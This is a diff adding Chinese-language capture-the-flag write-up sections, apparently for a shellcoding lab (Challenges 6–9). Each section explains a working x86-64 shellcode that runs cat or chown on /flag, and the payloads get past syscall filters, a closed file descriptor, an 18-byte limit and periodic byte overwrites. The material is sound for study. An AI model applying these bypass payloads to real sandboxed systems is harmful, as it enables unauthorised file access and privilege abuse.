@@ -180,5 +180,143 @@ arg2: .string "/flag"
 
 这个题目会过滤 `syscall (0x0f 0x05)` 指令，直接在内存上现场构造即可。
 
+<details markdown="1">
+<summary>shell.s (剧透警告)</summary>
+```nasm
+.section .text
+.global _start
+_start:
+	.fill 0x1000, 1, 0x90
+	movb $0xf, target(%rip)
+	movb $0x5, target+1(%rip)
+	leaq cmd(%rip), %rdi
+	movq %rdi, argv1(%rip)
+	leaq arg2(%rip), %rsi
+	movq %rsi, argv2(%rip)
+	leaq argv1(%rip), %rsi
+	movq $0x3b, %rax
+	movq $0x0, %rdx
+target: .long 0
+	
+	
+
+cmd: .string "/bin/cat"
+argv1:  .long 0
+	        .long 0
+argv2:  .long 0
+	        .long 0
+	        .long 0
+	        .long 0
+arg2: .string "/flag"
+```
+
+</details>
+
+
 ## Challenge 7 Shellcode with closed file descriptor
 
+这个题目将所有的文件描述符都关闭了，因此不能通过 `cat` 之类的进行读取 flag。
+我使用了 `chown` 直接改变 `/flag` 的权限。
+
+<details markdown="1">
+<summary>shell.s (剧透警告)</summary>
+```nasm
+.section .text
+.global _start
+_start:
+	movb $0xf, target(%rip)
+	movb $0x5, target+1(%rip)
+	leaq cmd(%rip), %rdi
+	movq %rdi, argv1(%rip)
+
+	leaq arg2(%rip), %rsi
+	movq %rsi, argv2(%rip)
+
+	leaq arg3(%rip), %rsi
+	movq %rsi, argv3(%rip)
+
+	leaq argv1(%rip), %rsi
+	movq $0x3b, %rax
+	movq $0x0, %rdx
+target: .long 0
+	
+	
+
+cmd: .string "/bin/chown"
+argv1:  .long 0
+	.long 0
+argv2:  .long 0
+	.long 0
+argv3:  .long 0
+	.long 0
+	        .long 0
+	        .long 0
+arg2: .string "hacker"
+arg3: .string "/flag"
+
+```
+</details>
+
+## Challenge 8 18 Byte Shellcode
+
+这个是一个很有趣的题目，只允许 18 byte，我并没有分析在调用点进入时，有哪些寄存器不需要设置（可以复用）。
+而是继续坚持使用 `execve("/bin/cat", NULL, NULL)`，但很显然 `/bin/cat` 会导致我的 Shellcode 超过上限。
+
+因此，我用 C 语言编写了一个程序，命名为 `f` 放在当前的工作目录下，然后再利用 `execve` 调用该文件 `f` 来读取 flag。
+
+
+<details markdown="1">
+<summary>shell.s (剧透警告)</summary>
+```nasm
+.section .text
+.global _start
+_start:
+	xor %esi, %esi
+	xor %edx, %edx
+	lea flag(%rip), %rdi
+	push $0x3B
+	pop %rax
+	syscall
+flag: .string "f"
+```
+</details>
+
+## Challenge 9 Modified Shellcode
+
+每隔 10 个 Byte，Shellcode 就会被改写，处理方式非常简单，用 `jmp` 把被改写部分跳过。
+
+<details markdown="1">
+<summary>shell.s (剧透警告)</summary>
+```nasm
+.section .text
+.global _start
+_start:
+	leaq cmd(%rip), %rdi
+        jmp 0f
+        .fill 11, 1, 0x90
+0:      leaq arg2(%rip), %r10
+        jmp 1f
+        .fill 11, 1, 0x90
+1:      movq %r10, (%rsp)
+        jmp 2f
+        .fill 14, 1, 0x90
+2:      movq %r10, -8(%rsp)
+        jmp 3f
+        .fill 13, 1, 0x90
+3:      movq $0x0, %rdx
+        jmp 4f
+        .fill 11, 1, 0x90
+4:      leaq -8(%rsp), %rsi
+        jmp 5f
+        .fill 13, 1, 0x90
+5:      movq $0x3b, %rax
+        jmp 6f
+        .fill 11, 1, 0x90
+6:      movq %rdx, 8(%rsp)
+        syscall
+.fill 13, 1, 0x90
+cmd: .string "/bin/cat"
+.fill 11, 1, 0x90
+arg2: .string "/flag"
+```
+</details>
